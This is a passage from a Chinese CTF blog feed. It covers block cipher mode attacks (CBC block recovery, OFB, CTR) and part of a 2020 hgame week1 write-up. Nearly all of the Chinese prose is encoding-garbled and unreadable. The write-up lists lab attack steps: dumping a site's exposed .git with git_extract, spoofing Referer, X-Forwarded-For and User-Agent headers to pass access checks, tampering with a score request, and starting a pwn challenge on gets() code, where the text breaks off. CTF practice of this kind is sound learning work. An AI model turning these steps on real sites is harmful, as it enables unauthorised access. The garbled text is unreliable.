å¯†é˜¶æ®µï¼Œflagæ˜¯å›¾ä¸­å³ä¾§çš„f1,f2,f3</p><p><strong>æ­¥éª¤1ï¼šæ‹¿ç¬¬ä¸€æ®µflag(ç§°ä¸ºflag1)ï¼š</strong></p><p>æ—¢ç„¶ç¨‹åºä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œè§£å¯†ï¼Œæˆ‘ä»¬å‘é€ä¸€ä¸²ä¸flagå¯†æ–‡ç­‰é•¿çš„å¯†æ–‡è¿‡å»ï¼Œç¨‹åºè§£å¯†åè¿”å›ä¸€æ®µæ˜æ–‡ã€‚</p><p>çœ‹åˆ°è§£å¯†ç¬¬ä¸€æ¡ï¼Œæˆ‘ä»¬åªéœ€è¦å°†æ˜æ–‡å’Œå¯†æ–‡çš„<strong>å‰16å­—èŠ‚</strong>é€ä½å¼‚æˆ–å°±èƒ½å¾—åˆ°<strong>$e_k(IV)$</strong>çš„å€¼ã€‚</p><p>è€Œä¸‰æ¬¡è§£å¯†ä¹‹åç¨‹åºè¿”å›çš„<strong>flagçš„å¯†æ–‡</strong>çš„<strong>ç¬¬ä¸€ç»„</strong>å°±æ˜¯<strong>flag1ä¸$e_k(IV)$å¼‚æˆ–</strong>çš„ç»“æœã€‚æ‰€ä»¥æˆ‘ä»¬æ‹¿ç€<strong>$e_k(IV)$åŒflagçš„å¯†æ–‡çš„ç¬¬ä¸€ç»„å¼‚æˆ–</strong>å°±èƒ½å¾—åˆ°<strong>flag1</strong>ã€‚</p><p><strong>æ­¥éª¤2ï¼šæ‹¿ç¬¬äºŒæ®µflag(ç§°ä¸ºflag2)ï¼š</strong></p><p>çœ‹åˆ°åŠ å¯†é‚£ä¸€ä¾§ï¼Œflag2æ˜¯flagçš„æ˜æ–‡åŒ$e_k(y_1)$å¼‚æˆ–çš„ç»“æœï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ‹¿åˆ°$e_k(y_1)$</p><p>æˆ‘ä»¬ç°åœ¨æ˜¯æ‰‹æŒflag1çš„äººï¼Œæˆ‘ä»¬ç°æŠŠå°†è¦å‘é€çš„48å­—èŠ‚åˆ’åˆ†ä¸ºä¸‰æ®µï¼Œflag1ï¼špad1ï¼špad2</p><p>åœ¨ç»è¿‡ç¬¬ä¸€æ¬¡è§£å¯†åï¼Œæˆ‘ä»¬çš„å¾—åˆ°çš„ç»“æœçš„ç»„æˆæ˜¯ï¼š</p><p><strong>flag1ä¸$e_k(IV)$å¼‚æˆ–çš„ç»“æœf1</strong></p><p><strong>pad1ä¸$e_k(flag1)$å¼‚æˆ–çš„ç»“æœf2</strong></p><p><strong>pad2ä¸$e_k(pad1)$å¼‚æˆ–çš„ç»“æœf3</strong></p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦è½¬å˜æ€æƒ³çš„æ˜¯ï¼Œåœ¨åŠ å¯†é˜¶æ®µï¼Œflag1ä¸$e_k(IV)$å¼‚æˆ–çš„ç»“æœå°±æ˜¯y1ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å·²ç»æ‹¿åˆ°y1äº†</p><p>ç„¶åæˆ‘ä»¬åªéœ€è¦å°†æˆ‘ä»¬è¦å‘é€çš„48å­—èŠ‚åˆ’åˆ†ä¸ºä¸‰æ®µï¼šy1ï¼špad1ï¼špad2</p><p>æˆ‘ä»¬å¾—åˆ°çš„ç»“æœçš„ç»„æˆå°±æ˜¯ï¼š</p><p><strong>y1ä¸$e_k(IV)$å¼‚æˆ–çš„ç»“æœf1</strong></p><p><strong>pad1ä¸$e_k(y1)$å¼‚æˆ–çš„ç»“æœf2</strong></p><p><strong>pad2ä¸$e_k(pad1)$å¼‚æˆ–çš„ç»“æœf3</strong></p><p>ç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦å°†f2å’Œpad1å¼‚æˆ–å°±èƒ½æå–å‡º$e_k(y1)$äº†ã€‚ç„¶åå°±å¯ä»¥æ‹¿å»è§£å¯†flag2äº†ã€‚</p><p><strong>æ­¥éª¤3ï¼šæ‹¿ç¬¬ä¸‰æ®µflag(ç§°ä¸ºflag3)</strong></p><p>ç°åœ¨æˆ‘ä»¬æ˜¯æ‰‹æŒflag1å’Œflag2çš„äººäº†ã€‚ä¸ºäº†æ‹¿åˆ°flag3ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°ä¸Šå›¾å³ä¾§çš„$e_k(y2)$</p><p>è€Œä¸Šå›¾å³ä¾§y2æ˜¯flag2å’Œ$e_k(y1)$å¼‚æˆ–çš„ç»“æœï¼Œflag2æˆ‘ä»¬æœ‰äº†ï¼Œ$e_k(y1)$æˆ‘ä»¬ä¹Ÿèƒ½æ‹¿åˆ°ï¼Œé‚£å°±æ²¡å•¥å›°éš¾äº†ã€‚</p><p>é¦–å…ˆé‡å¤ç¬¬äºŒæ­¥éª¤çš„æ“ä½œæ‹¿åˆ°$e_k(y1)$ï¼Œç„¶åæˆ‘ä»¬å°†$e_k(y1)$å’Œflag2å¼‚æˆ–å¾—åˆ°y2</p><p>ç„¶åæˆ‘ä»¬å‘é€çš„48å­—èŠ‚çš„ç»„æˆä¸ºï¼špad1ï¼šy2ï¼špad2</p><p>è¿™æ ·æˆ‘ä»¬å¾—åˆ°çš„ç»“æœçš„ç»„æˆå°±æ˜¯ï¼š</p><p><strong>pad1ä¸$e_k(IV)$å¼‚æˆ–çš„ç»“æœf1</strong></p><p><strong>y2ä¸$e_k(pad1)$å¼‚æˆ–çš„ç»“æœf2</strong></p><p><strong>pad2ä¸$e_k(y2)$å¼‚æˆ–çš„ç»“æœf3</strong></p><p>ç°åœ¨æˆ‘ä»¬åªéœ€è¦å°†f3å’Œpad2å¼‚æˆ–å°±èƒ½æå–å‡º$e_k(y2)$äº†ã€‚ç„¶åå°±å¯ä»¥æ‹¿å»è§£å¯†flag3äº†ã€‚</p><h4 id="è¾“å‡ºåé¦ˆæ¨¡å¼-OFB"><a href="#è¾“å‡ºåé¦ˆæ¨¡å¼-OFB" class="headerlink" title="è¾“å‡ºåé¦ˆæ¨¡å¼(OFB)"></a>è¾“å‡ºåé¦ˆæ¨¡å¼(OFB)</h4><p>â€‹        OFBæ¨¡å¼å½¢æˆäº†ä¸€ä¸ªåŒæ­¥åºåˆ—å¯†ç ,å› ä¸ºæ­¤å¯†é’¥åºåˆ—æ—¢ä¸ä¾èµ–æ˜æ–‡ï¼Œä¹Ÿä¸ä¾èµ–å¯†æ–‡ã€‚åŒCFBæ¨¡å¼ç›¸åŒæ˜¯ï¼Œæ¥æ”¶è€…ä¸éœ€è¦ä½¿ç”¨åˆ†ç»„å¯†ç çš„è§£å¯†å‡½æ•°æ¥è§£å¯†å¯†æ–‡ã€‚</p><p>åŠ è§£å¯†è§„åˆ™</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›</strong></p><p><strong>$x_iï¼Œy_iï¼Œs_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼ŒIVè¡¨ç¤ºé•¿åº¦ä¸ºbçš„åˆå§‹å‘é‡</strong>ï¼ˆä¸éœ€è¦å¡«å……ï¼‰</p><p><strong>åŠ å¯†</strong>ï¼š$s_1=e_k(IV)    ä¸”y_1=s_1âŠ•x_1$    </p><p>&emsp;&emsp;    $s_i=e_k(s_{i-1})    ä¸”y_i=s_iâŠ•x_i      ,iâ‰¥2$</p><p><strong>è§£å¯†</strong>ï¼š$s_1=e_k(IV)    ä¸”x_1=s_1âŠ•y_1$    </p><p>&emsp;&emsp;    $s_i=e_k(s_{i-1})    ä¸”x_i=s_iâŠ•y_i      ,iâ‰¥2$ </p><p>OFBæ¨¡å¼å¹¶ä¸æ˜¯é€šè¿‡å¯†ç ç®—æ³•å¯¹æ˜æ–‡é—´æ¥è¿›è¡ŒåŠ å¯†çš„ï¼Œè€Œæ˜¯é€šè¿‡å°†â€œæ˜æ–‡åˆ†ç»„â€å’Œâ€œå¯†ç ç®—æ³•çš„è¾“å‡ºâ€è¿›è¡ŒXORæ¥äº§ç”Ÿâ€œå¯†æ–‡åˆ†ç»„â€çš„ï¼Œåœ¨è¿™ä¸€ç‚¹ä¸ŠOFBæ¨¡å¼å’ŒCFBæ¨¡å¼ååˆ†ç±»ä¼¼ã€‚ </p><p>è€Œä¸”OFB å¯äº‹å‰è¿›è¡ŒåŠ å¯†ã€è§£å¯†çš„é¢„å¤‡ã€‚ä¸ECBä¸åŒçš„æ˜¯ï¼Œè™½ç„¶æ¯ä¸€ç»„åŠ å¯†ä¹Ÿç›¸äº’ç‹¬ç«‹ï¼Œä½†æ˜æ–‡çš„é‡å¤æ’åˆ—ä¸ä¼šååº”åœ¨å¯†æ–‡ä¸­ã€‚å› ä¸ºä¸€èˆ¬æƒ…å†µä¸‹æ¯æ¬¡åŠ å¯†éƒ½ä¼šä½¿ç”¨æ–°çš„IVï¼Œæ‰€ä»¥ä½¿å¾—OFBèƒ½å¤ŸæŠµå¾¡é‡æ”¾æ”»å‡»</p><h5 id="ç¼ºé™·-3"><a href="#ç¼ºé™·-3" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>ç”±äºæ¯ä¸€ç»„çš„åŠ è§£å¯†ç‹¬ç«‹ï¼Œè¿™é™ä½äº†åè½¬å­—èŠ‚è¿™æ ·çš„ä¸»åŠ¨æ”»å‡»çš„æˆæœ¬ã€‚ï¼ˆä¸éœ€è¦æ‰¾â€æ“¦å±è‚¡çš„äººâ€œäº†ï¼‰</p><h4 id="è®¡æ•°å™¨æ¨¡å¼-CTR"><a href="#è®¡æ•°å™¨æ¨¡å¼-CTR" class="headerlink" title="è®¡æ•°å™¨æ¨¡å¼(CTR)"></a>è®¡æ•°å™¨æ¨¡å¼(CTR)</h4><p>æ„Ÿè§‰ä¸Šæ˜¯OFBæ¨¡å¼çš„å‡çº§ç‰ˆ</p><p>åŠ è§£å¯†è§„åˆ™ï¼š</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›</strong></p><p><strong>$x_iï¼Œy_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼Œåˆå§‹å€¼IVå’Œè®¡æ•°å™¨$CTR_i$çš„è¿æ¥è¡¨ç¤ºä½è¡¨ç¤ºä¸º(IV || $CTR_i$ä¹Ÿæ˜¯ä¸€ä¸ªé•¿åº¦ä¸ºbä½çš„ä½å­—ç¬¦ä¸²</strong>ï¼ˆä¸éœ€è¦å¡«å……ï¼‰</p><p><strong>åŠ å¯†ï¼š    $y_1=e_k(IV || CTR_i) âŠ•x_1    ï¼Œiâ‰¥1$</strong></p><p><strong>è§£å¯†ï¼š    $x_1=e_k(IV || CTR_i) âŠ•y_1    ï¼Œiâ‰¥1$</strong></p><p>è§£é‡Šä¸€ä¸‹è¿™ä¸ªå¯†é’¥åºåˆ—æ˜¯å¦‚ä½•ç”Ÿæˆï¼š</p><p>&emsp;&emsp;æ¯”å¦‚128ä½çš„AESã€‚é¦–å…ˆé€‰æ‹©ä¸€ä¸ªIV,é•¿åº¦å°äºåˆ†ç»„é•¿åº¦(æ¯”å¦‚96ä½)ã€‚è€Œå‰©ä¸‹çš„32ä½åˆ™ç”±è®¡æ•°å™¨ä½¿ç”¨ï¼Œå¹¶ä¸”è¯¥è®¡æ•°å™¨çš„CTRå€¼åˆå§‹åŒ–ä¸º0ã€‚åœ¨ä¼šè¯æœŸé—´åŠ å¯†çš„æ¯ä¸ªåˆ†ç»„ï¼Œè®¡æ•°å™¨éƒ½ä¼šé€’å¢è€ŒIVåˆ™ä¿æŒä¸å˜ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œåœ¨ä¸æ›´æ¢IVçš„æƒ…å†µä¸‹å¯åŠ å¯†çš„æœ€å¤§åˆ†ç»„ä¸ªæ•°ä¸º$2^{32}$ã€‚ç”±äºæ¯ä¸ªåˆ†ç»„é•¿åº¦éƒ½æ˜¯8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åœ¨ç”Ÿæˆä¸€ä¸ªæ–°çš„IVå‰ï¼Œå¯ä»¥åŠ å¯†çš„æœ€å¤§æ•°æ®å¤§å°ä¸º$8*2^{32}=2^{35}$å­—èŠ‚ï¼Œå¤§æ¦‚ä¸º32Gå­—èŠ‚ã€‚</p><p>&emsp;&emsp;ä¸OFBæ¨¡å¼å’ŒCFBæ¨¡å¼ä¸€æ ·ï¼ŒCTRæ¨¡å¼çš„å¯†é’¥åºåˆ—ä¹Ÿæ˜¯åˆ†ç»„è®¡ç®—ï¼Œä½†æœ€å¸å¼•äººçš„ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯å¯ä»¥å¹¶è¡ŒåŒ–ï¼Œå› ä¸ºè®¡æ•°å™¨æ¨¡å¼ä¸éœ€è¦ä»»ä½•åé¦ˆï¼Œè¿™ä¸OFBæˆ–CFBæ¨¡å¼å®Œå…¨ä¸åŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è®©ä¸¤ä¸ªåˆ†ç»„å¯†ç å¼•æ“åŒæ—¶å¹¶è¡Œå·¥ä½œï¼Œå³è®©ä¸¤ä¸ªå¼•æ“åŒæ—¶ä½¿ç”¨ç¬¬ä¸€ä¸ªåˆ†ç»„å¯†ç åŠ å¯†è®¡æ•°å™¨å€¼CTRå’ŒCTR2ã€‚ ç­‰è¿™ä¸¤ä¸ªåˆ†ç»„å¯†ç å¼•æ“å®Œæˆåï¼Œç¬¬ä¸€ä¸ªå¼•æ“å°†ç»§ç»­åŠ å¯†å€¼CTR3,è€Œå¦ä¸€ä¸ªå¼•æ“åˆ™ç»§ç»­åŠ å¯†CTR,å¦‚æ­¤å¾ªç¯ã€‚</p><p>&emsp;&emsp;è¿™ç§æ–¹æ¡ˆçš„åŠ å¯†é€Ÿç‡æ˜¯å•ä¸ªå®ç°æ–¹å¼çš„ä¸¤å€ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªåˆ†ç»„å¯†ç å¼•æ“ï¼Œè¿™ä¹Ÿä¼šä½¿åŠ å¯†é€Ÿç‡æŒ‰æ¯”ä¾‹å¢åŠ ã€‚å¯¹ååç‡è¦æ±‚ä¸¥æ ¼çš„åº”ç”¨è€Œè¨€ï¼Œæ¯”å¦‚åœ¨è¦æ±‚å‡ Gb/sæ•°æ®ç‡çš„ç½‘ç»œä¸­ï¼Œå¹¶è¡ŒåŒ–çš„åŠ å¯†æ¨¡å¼éå¸¸åˆé€‚ã€‚</p><h5 id="ç¼ºé™·-4"><a href="#ç¼ºé™·-4" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>ä¸OFBæ¨¡å¼ç›¸åŒï¼Œé™ä½äº†åè½¬å­—èŠ‚è¿™æ ·çš„ä¸»åŠ¨æ”»å‡»çš„æˆæœ¬ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>&emsp;&emsp;æ€»çš„æ¥è¯´ï¼Œæ„Ÿè§‰ç°åœ¨ç”¨çš„æ¯”è¾ƒå¤šçš„è¿˜æ˜¯CBCåŠ å¯†æ¨¡å¼ï¼ŒCTFä¸­OFBåŠ å¯†æ¨¡å¼å’ŒCTRåŠ å¯†æ¨¡å¼çš„èµ›é¢˜ä¹Ÿä¸å¸¸è§ã€‚</p><p>&emsp;&emsp;ä½†å¯¹åˆ†ç»„åŠ å¯†çš„äº”ç§ä¸»æµåŠ å¯†æ¨¡å¼åŠå…¶ä¸€äº›æ”»å‡»æ‰‹æ³•çš„å­¦ä¹ ï¼Œå¯ä»¥è®©æˆ‘ä»¬äº†è§£è¿™äº”ç§æ¨¡å¼çš„å„è‡ªçš„ä¼˜ç¼ºç‚¹ï¼Œè¿™æ ·ï¼Œå°±ç®—åœ¨ä»¥åçš„CTFçš„èµ›é¢˜ä¸­é‡åˆ°ï¼Œæˆ‘ä»¬ä¹Ÿå¥½æœ‰çš„æ”¾çŸ¢ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>ã€Šæ·±å…¥æµ…å‡ºå¯†ç å­¦â€”â€”å¸¸ç”¨åŠ å¯†æŠ€æœ¯åŸç†ä¸åº”ç”¨ã€‹ï¼ˆæ¸…åå¤§å­¦å‡ºç‰ˆç¤¾ï¼‰</p><p> <a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">https://blog.csdn.net/csu_vc/article/details/79619309</a> </p><p> <a href="https://blog.csdn.net/chengqiuming/article/details/82355772" target="_blank" rel="noopener">https://blog.csdn.net/chengqiuming/article/details/82355772</a> </p><p> <a href="https://www.dazhuanlan.com/2019/09/02/5d6c9d6f823a7/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/09/02/5d6c9d6f823a7/</a> </p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Block </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ“ä½œæ¨¡å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 hgame week1</title>
      <link href="/2020/02/18/2020hgame_week1/"/>
      <url>/2020/02/18/2020hgame_week1/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>â€‹        2020hgameå¼€å§‹äº†ï¼Œä½œä¸ºè‡ª2019hgameå…¥æ‰‹ctfçš„èŒæ–°ï¼Œåˆæ¥hgameå­¦ä¹ äº†ã€‚è¿™ä¸€æ¬¡çš„week1æ„Ÿè§‰æ¯”å»å¹´åˆéš¾äº†ä¸€ä¸ªæ¡£æ¬¡ï¼Œä¸è¿‡èŠ±äº†å››å¤©æ‘¸çˆ¬æ»šæ‰“ï¼Œè¿è’™å¸¦çŒœï¼Œç»ˆäºæ˜¯aakäº†ï¼Œè¿™é‡Œç•™ä¸‹è¯¦ç»†wpä»¥ä¾›å­¦ä¹ ã€‚å…¶ä¸­äºŒè¿›åˆ¶æ–¹å‘æ˜¯æœ€è¿‘æ‰å¼€å§‹æ¥è§¦çš„ï¼Œè‹¥æœ‰ä¸å½“ä¹‹å¤„ï¼Œæœ›æŒ‡æ­£ã€‚</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmosçš„åšå®¢"><a href="#Cosmosçš„åšå®¢" class="headerlink" title="Cosmosçš„åšå®¢"></a>Cosmosçš„åšå®¢</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š"><a href="#é¢˜ç›®ä»‹ç»ï¼š" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>Cosmos çš„åšå®¢</p><p>ä½ å¥½ã€‚æ¬¢è¿ä½ æ¥åˆ°æˆ‘çš„åšå®¢ã€‚</p><p>å¤§èŒ„å­è®©æˆ‘æŠŠ flag è—åœ¨æˆ‘çš„è¿™ä¸ªåšå®¢é‡Œã€‚ä½†æˆ‘å‰å‰ååæ”¹äº†å¾ˆå¤šéï¼Œè¿˜æ˜¯è§‰å¾—ä¸æ»¡æ„ã€‚ä¸è¿‡æœ‰å¤§èŒ„å­å‘Šè¯‰æˆ‘çš„<strong>ç‰ˆæœ¬ç®¡ç†å·¥å…·</strong>ä»¥åŠ GitHubï¼Œæˆ‘æ”¹èµ·æ¥ä¹ŸæŒºæ–¹ä¾¿çš„ã€‚</p><h4 id="è§£é¢˜æ€è·¯ï¼š"><a href="#è§£é¢˜æ€è·¯ï¼š" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>é€šè¿‡é¢˜é¢ä¸­æåˆ°çš„githubå¯ä»¥æƒ³åˆ°å¯èƒ½æ˜¯.gitæ³„éœ²</p><p>äºæ˜¯åˆ©ç”¨å·¥å…·git_extractï¼š <a href="https://github.com/gakki429/Git_Extract" target="_blank" rel="noopener">https://github.com/gakki429/Git_Extract</a> </p><p>å¯ä»¥dumpåˆ°.gitæ–‡ä»¶ï¼Œ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python git_extract<span class="selector-class">.py</span> http:<span class="comment">//cosmos.hgame.n3ko.co/.git/</span></span><br></pre></td></tr></table></figure><p>åœ¨å…¶ä¸­çš„configæ–‡ä»¶é‡Œé¢æœ‰ä¸€ä¸ªgithubé¡¹ç›®çš„ç½‘å€</p><p>è¿›å…¥é¡µé¢ç‚¹å‡»äººååˆ°commitï¼Œ</p><p>ç‚¹æœ€ä¸‹é¢çš„é¡¹ç›®</p><p>è·å¾—flagçš„base64ï¼Œ</p><p>è§£ç å³å¯</p><p>flagï¼šhgame{g1t_le@k_1s_danger0us_!!!!}</p><h3 id="æ¥å¤´éœ¸ç‹"><a href="#æ¥å¤´éœ¸ç‹" class="headerlink" title="æ¥å¤´éœ¸ç‹"></a>æ¥å¤´éœ¸ç‹</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-1"><a href="#é¢˜ç›®ä»‹ç»ï¼š-1" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>HGAME Re:Dive å¼€æœå•¦~</p><h4 id="è§£é¢˜æ€è·¯ï¼š-1"><a href="#è§£é¢˜æ€è·¯ï¼š-1" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ä»åå­—å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸€é¢˜çš„è€ƒç‚¹æ˜¯æŠ¥æ–‡å¤´ï¼Œæ‰€ä»¥å¼€å¥½burpsuitï¼Œç›´æ¥æŠ“åŒ…</p><p>step1ï¼šYou need to come from  <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a></p><p>è¿›è¡Œrefererä¼ªé€ ï¼Œ</p><p>Referer: <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a></p><p>step2ï¼šYou need to visit it locally.</p><p>è¿›è¡Œipä¼ªé€ ï¼š</p><p>x-forwarded-for: 127.0.0.1</p><p>step3:You need to use Cosmos Brower to visit.</p><p>è¿›è¡ŒUAä¼ªé€ ï¼šUser-Agent: Cosmos Brower    ï¼ˆå‡ºé¢˜äººæ‹¼é”™å•è¯23333ï¼‰</p><p>step4ï¼šYour should use POST method :)</p><p>æ›´æ”¹è¯·æ±‚æ–¹å¼ä½POSTï¼š</p><p>step5ï¼šThe flag will be updated after 2077, please wait for it patiently.</p><p>é¢˜é¢è¯´flagåœ¨2077å¹´ä¼šupdatedä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯·æ±‚åœ¨2077å¹´ä¹‹åä¸å†æ›´æ–°çš„èµ„æº</p><p>If-Unmodified-Since: Fri, 01 Oct 2077 00:00:00 GMT</p><p>å¾—åˆ°flagï¼šhgame{W0w!Your_heads_@re_s0_many!}</p><h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-2"><a href="#é¢˜ç›®ä»‹ç»ï¼š-2" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>Code is exciting!<br>å‚æ•°açš„æäº¤æ ¼å¼ä¸º: ä¸¤æ•°ç›¸åŠ (a=b+c)</p><h4 id="è§£é¢˜æ€è·¯ï¼š-2"><a href="#è§£é¢˜æ€è·¯ï¼š-2" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>è¿™é“é¢˜ä¸€è¿›å»å°±ä¼šé‡å®šå‘åˆ°ä¸€ä¸ªnew.php</p><p>å¥½å¤šæ–°äººè®¤ä¸ºæ˜¯é¢˜ç›®çš„é—®é¢˜ï¼Œä»¥ä¸ºé¢˜ç›®ç‚¸äº†ï¼Œå…¶å®æ‰“å¼€f12å¯ä»¥çœ‹è§ã€‚è¢«302é‡å®šå‘äº†</p><p>æ‰€ä»¥æˆ‘ä»¬burpsuitæŠ“åŒ…æ‹¦æˆªï¼Œ</p><p>å‘ç°405Not Allowedï¼Œ</p><p>è¿™é‡Œå¹¶æ²¡æœ‰å‘ç°ä»»ä½•åˆ¤æ–­èº«ä»½çš„å‚æ•°ï¼Œæœ€åå°è¯•æ›´æ”¹è¯·æ±‚æ–¹å¼ä¸ºPOST</p><p>é¢˜é¢çš„æ„æ€æ˜¯è®©æˆ‘ä»¬é€šè¿‡å‚æ•°aè®¡ç®—ä¸¤æ•°ä¹‹å’Œï¼Œ</p><p>è¯•ç€æäº¤ï¼Œa=1+9</p><p>å‘ç°å¤±è´¥äº†ï¼Œå› ä¸ºurlä¸­ã€‚â€˜+â€™å…¶å®è¡¨ç¤ºç©ºæ ¼ï¼Œè¿™é‡Œæˆ‘ä»¬å°†â€˜+â€™ç¼–ç ï¼Œurlencodeåï¼Œä¼ è¿‡å»ï¼Œ</p><p>payloadï¼š?a=1%2b9</p><p>flag:hgame{C0d3_1s_s0_S@_sO_C0ol!}</p><h3 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-3"><a href="#é¢˜ç›®ä»‹ç»ï¼š-3" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>å¬è¯´ä½ çƒæŠ€é«˜è¶…ï¼Ÿ</p><h4 id="è§£é¢˜æ€è·¯ï¼š-3"><a href="#è§£é¢˜æ€è·¯ï¼š-3" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>è¿›å…¥é¡µé¢ï¼Œæ˜¯ä¸ªæ‰“ç –å—çš„æ¸¸æˆï¼Œç›²çŒœæ˜¯ä½œå¼Šè¯¥åˆ†æ•°äº†ã€‚</p><p>burpsuitå¼€å¯æ‹¦æˆªï¼Œéšä¾¿ç©ä¸‹ï¼Œè¾“æ‰æ¸¸æˆåå¯ä»¥æŠ“åˆ°åŒ…</p><p>æŠŠé‡Œçš„åˆ†æ•°ï¼š2000ï¼Œæ”¹æ‰ã€‚éšä¾¿æ¥ä¸ªå¤§ä¸€ç‚¹çš„</p><p>å¾—åˆ°flagï¼šhgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-4"><a href="#é¢˜ç›®ä»‹ç»ï¼š-4" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>æ— è„‘AAAå¤ªæ— èŠäº†ï¼ŒæŒ‘æˆ˜æ›´é«˜éš¾åº¦çš„æ— è„‘AAAï¼<br>nc 47.103.214.163 20000</p><h4 id="è§£é¢˜æ€è·¯ï¼š-4"><a href="#è§£é¢˜æ€è·¯ï¼š-4" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>é™æ€åˆ†ææ ¸å¿ƒä»£ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  alarm(<span class="number">8u</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0xA0</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span 